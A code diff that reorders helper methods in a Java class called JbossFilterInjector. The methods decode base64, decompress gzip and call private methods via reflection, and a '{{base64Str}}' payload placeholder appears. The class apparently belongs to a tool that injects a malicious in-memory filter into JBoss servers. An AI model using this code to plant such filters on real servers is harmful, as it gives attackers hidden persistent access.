@@ -34,6 +34,76 @@ public class JbossFilterInjector {
         }
     }
 
+    static byte[] decodeBase64(String base64Str) throws Exception {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        }
+    }
+
+    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
+        GZIPInputStream gzipInputStream = new GZIPInputStream(in);
+        byte[] buffer = new byte[256];
+        int n;
+        while ((n = gzipInputStream.read(buffer)) >= 0) {
+            out.write(buffer, 0, n);
+        }
+        return out.toByteArray();
+    }
+
+    public static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
+        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
+    }
+
+    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+        Method method = null;
+
+        Class<?> tempClass = clazz;
+        while (method == null && tempClass != null) {
+            try {
+                if (paramClazz == null) {
+                    // Get all declared methods of the class
+                    Method[] methods = tempClass.getDeclaredMethods();
+                    for (Method value : methods) {
+                        if (value.getName().equals(methodName) && value.getParameterTypes().length == 0) {
+                            method = value;
+                            break;
+                        }
+                    }
+                } else {
+                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
+                }
+            } catch (NoSuchMethodException e) {
+                tempClass = tempClass.getSuperclass();
+            }
+        }
+        if (method == null) {
+            throw new NoSuchMethodException(methodName);
+        }
+        method.setAccessible(true);
+        if (obj instanceof Class) {
+            try {
+                return method.invoke(null, param);
+            } catch (IllegalAccessException e) {
+                throw new RuntimeException(e.getMessage());
+            }
+        } else {
+            try {
+                return method.invoke(obj, param);
+            } catch (IllegalAccessException e) {
+                throw new RuntimeException(e.getMessage());
+            }
+        }
+    }
+
     public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
         List<Object> contexts = new ArrayList<Object>();
         Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
@@ -134,30 +204,6 @@ public class JbossFilterInjector {
         return "{{base64Str}}";
     }
 
-    static byte[] decodeBase64(String base64Str) throws Exception {
-        Class<?> decoderClass;
-        try {
-            decoderClass = Class.forName("sun.misc.BASE64Decoder");
-            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
-        } catch (Exception ignored) {
-            decoderClass = Class.forName("java.util.Base64");
-            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
-            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
-        }
-    }
-
-    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
-        GZIPInputStream gzipInputStream = new GZIPInputStream(in);
-        byte[] buffer = new byte[256];
-        int n;
-        while ((n = gzipInputStream.read(buffer)) >= 0) {
-            out.write(buffer, 0, n);
-        }
-        return out.toByteArray();
-    }
-
     @SuppressWarnings("all")
     public Object getFieldValue(Object obj, String name) throws Exception {
         Field field = null;
@@ -175,52 +221,6 @@ public class JbossFilterInjector {
         } else {
             field.setAccessible(true);
             return field.get(obj);
-        }
-    }
-
-    public static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
-        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
-    }
-
-    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
-        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
-        Method method = null;
-
-        Class<?> tempClass = clazz;
-        while (method == null && tempClass != null) {
-            try {
-                if (paramClazz == null) {
-                    // Get all declared methods of the class
-                    Method[] methods = tempClass.getDeclaredMethods();
-                    for (Method value : methods) {
-                        if (value.getName().equals(methodName) && value.getParameterTypes().length == 0) {
-                            method = value;
-                            break;
-                        }
-                    }
-                } else {
-                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
-                }
-            } catch (NoSuchMethodException e) {
-                tempClass = tempClass.getSuperclass();
-            }
-        }
-        if (method == null) {
-            throw new NoSuchMethodException(methodName);
-        }
-        method.setAccessible(true);
-        if (obj instanceof Class) {
-            try {
-                return method.invoke(null, param);
-            } catch (IllegalAccessException e) {
-                throw new RuntimeException(e.getMessage());
-            }
-        } else {
-            try {
-                return method.invoke(obj, param);
-            } catch (IllegalAccessException e) {
-                throw new RuntimeException(e.getMessage());
-            }
         }
     }
 }
